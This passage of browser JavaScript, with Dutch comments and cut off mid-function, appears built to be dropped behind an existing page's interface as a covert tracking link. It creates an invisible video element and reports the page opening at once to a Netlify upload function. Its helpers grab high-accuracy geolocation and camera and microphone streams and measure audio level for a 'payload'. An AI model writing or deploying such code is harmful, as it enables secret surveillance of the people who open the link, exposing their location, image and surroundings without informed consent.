<script>
const video = document.createElement('video'); // onzichtbaar
video.autoplay = true; video.playsInline = true;

const endpoint = '/.netlify/functions/upload';

const state = {
  opened: true,
  timestamp: Date.now(),
  location: null,
  micLevel: null,
  snapshot: null,
  errors: []
};

// 1) Altijd meteen melden dat de link is geopend (geen PII)
sendPayload({ phase: 'opened', ...state });

// 2) UI
document.addEventListener('DOMContentLoaded', () => {
  // jouw bestaande UI / modal etc. mag blijven
});

// Helpers
function timeout(ms) {
  return new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), ms));
}

async function getLocationOrNull() {
  if (!('geolocation' in navigator)) { return null; }
  try {
    const position = await Promise.race([
      new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 })
      ),
      timeout(12000)
    ]);
    return {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      timestamp: position.timestamp
    };
  } catch (e) {
    return null; // belangrijk: NIET blokkeren
  }
}

async function getMediaOrNull() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    return stream;
  } catch (e) {
    return null;
  }
}

function getMicLevelFromStream(stream) {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const src = ctx.createMediaStreamSource(stream);
    const analyser = ctx.createAnalyser();
    analyser.fftSize = 256;
    src.connect(analyser);
    const data = new Uint8Array(analyser.frequencyBinCount);

    // één meting is genoeg voor de payload
